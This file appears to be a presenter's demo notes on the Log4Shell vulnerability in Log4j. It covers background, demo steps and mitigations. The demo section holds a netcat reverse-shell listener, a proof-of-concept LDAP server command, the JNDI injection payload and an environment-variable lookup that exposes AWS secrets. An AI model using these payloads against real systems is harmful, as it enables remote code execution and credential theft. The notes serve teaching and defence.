@@ -1,0 +1,24 @@
+1. log4shell vulnerability, CVSS 10, remote code execution
+2. Log4J, logging library, widespread use
+3. JNDI allows java objects to be serialized from remote sources
+4. common sources include an LDAP server for user related info
+5. JNDI lookup added in 2013, not publicly announced until 2021, might have have been exploited previously
+
+Commands for demo:
+start netcat to listen for reverse shell: nc -lvnp 9001
+run script that creates LDAP server: python3 poc.py --userip localhost --webport 8000 --lport 9001
+start container: docker run --network host log4j-shell-poc
+jndi request to our LDAP server: ${jndi:ldap://localhost:1389/a}
+
+${jndi:ldap://...}
+can also log environment variables
+${env:AWS_SECRET_ACCESS_KEY}
+
+
+mitigations and security considerations:
+1. wasn't what the devs did, it was what the devs didn't do 
+2. user was allowed to choose how the log was formatted, and what it contains
+3. sanitize user input, don't trust anything,  blacklist $(jndi:ldap://
+4. only allow jndi lookup to specific servers or disable remote codebases, com.sun.jndi.ldap.object.trustURLCodebase
+5. firewall rules to block jndi
+6. open source security, volunteers, really complicated for average user, left unnoticed for 8 years
